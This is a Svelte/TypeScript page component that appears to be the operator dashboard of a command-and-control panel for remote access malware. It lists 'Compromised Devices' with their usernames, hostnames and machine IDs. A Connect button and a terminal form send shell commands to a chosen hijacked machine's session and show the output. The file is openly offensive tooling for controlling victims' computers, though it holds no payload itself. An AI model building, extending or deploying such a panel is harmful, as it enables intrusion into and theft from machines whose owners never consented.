<script lang="ts">
  import { onMount } from 'svelte';
  import { enhance } from '$app/forms';
  import SplitPane from '$lib/components/SplitPane.svelte';

  let stdout: HTMLElement;
  let inputEl: HTMLElement;

  let cmd = $state("");
  let sid = $state("");
  let idle_s = $state("");
  let pwns = $state<{
        id: number;
        sid: string;
        username: string;
        hostname: string;
        model: string;
        machine_id: string;
        pwned_at: Date;
    }[]>([]);

  function Interact(device: {
        id: number;
        sid: string;
        username: string;
        hostname: string;
        model: string;
        machine_id: string;
        pwned_at: Date;
    }) {
        sid = device.sid;
        idle_s = `${device.username}@${device.hostname} >$`;
    }

  onMount(() => {
    async function updateList() {
      let res = await fetch('/api/devices', { credentials: "include" });
      let json = await res.json();
      pwns = json.devices;

      res = await fetch('/api/session', { credentials: "include" });
      json = await res.json();
      stdout.textContent = json.output;
    }

    async function updateOutput() {
      let res = await fetch('/api/devices', { credentials: "include" });
      let json = await res.json();
      pwns = json.devices;

      res = await fetch('/api/session', { credentials: "include" });
      json = await res.json();
      stdout.textContent = json.output;
    }

    updateList();
    updateOutput();
    const t1 = setInterval(updateList, 1000);
    const t2 = setInterval(updateOutput, 1000);

    document.body.classList.add('no-scroll');
    return () => {
        clearInterval(t1); // clean up on destroy
        clearInterval(t2); // clean up on destroy
        document.body.classList.remove('no-scroll');
    };
  });
</script>

<SplitPane>
  {#snippet topContent()}
    <div style="padding: 1rem;">
      <h2>Compromised Devices</h2><hr>
      <ul>
        {#each pwns as d}
            <li>
                <strong>{d.username}@{d.hostname}</strong>
                <small>({d.id})</small><br>

                Device: {d.model}<br>

                <small>
                    Machine ID:
                    <code>{d.machine_id}</code>
                </small><br>
                <button
                    class="btn btn-primary"
                    onclick={ () => { Interact(d) } }
                >Connect</button>
            </li>
        {/each}
      </ul>
    </div>
  {/snippet}

  {#snippet bottomContent()}
    <div class="terminal">
        <div class="stdout-area">
            <p id="term-out" bind:this={stdout} class="stdout">
            </p>
        </div>
        <form method="POST" action="?/send" use:enhance={() => {
            return async ({ update }) => {
                await update();
                cmd = '';
                inputEl.focus();
            };
        }}>
            <input
                id="cmd"
                name="cmd"
                class="stdin"
                type="text"
                bind:this={inputEl}
                bind:value={cmd}
                placeholder={idle_s}
                autocomplete="off"
                spellcheck="false"
            />
            <input
                type="hidden"
                id="sid"
                name="sid"
                bind:value={sid}
            >
        </form>
    </div>
  {/snippet}
</SplitPane>

<style>
    :global(body.no-scroll) {
        margin: 0;
        padding: 0;
        height: 100%;
        overflow: hidden;
    }

    .terminal {
        display: flex;
        flex-direction: column;
        height: 88%;
        min-height: 0;
    }

    .stdout-area {
        flex: 1;
        min-height: 0;
        overflow-y: auto;
        margin: 10px;
    }

    .stdout {
        padding: 10px;
        background-color: rgba(255, 255, 255, 0.05);
        color: #d4d4d4;
        border: 1px solid rgba(255, 255, 255, 0.1);
        border-radius: 4px;
        font-family: 'Courier New', monospace;
        font-size: 13px;
        white-space: pre-wrap;

        height: 95%;
    }

    .stdin {
        flex-shrink: 0;
        width: calc(100% - 20px);
        box-sizing: border-box;
        margin: 0 10px 10px;
        padding: 8px 12px;
        background-color: rgba(255, 255, 255, 0.05);
        color: #d4d4d4;
        border: 1px solid rgba(255, 255, 255, 0.1);
        border-radius: 4px;
        font-family: 'Courier New', monospace;
        font-size: 13px;
        outline: none;
        transition: border-color 0.15s, background-color 0.15s;
    }

    .stdin:focus {
        border-color: rgba(66, 133, 244, 0.6);
        background-color: rgba(255, 255, 255, 0.08);
    }

    .stdin::placeholder {
        color: #ffffff;
    }

    li {
        padding: 0.5rem 0;
        border-bottom: 1px solid #444;
    }

    small {
        color: #888;
    }

    code {
        font-family: monospace;
    }
</style>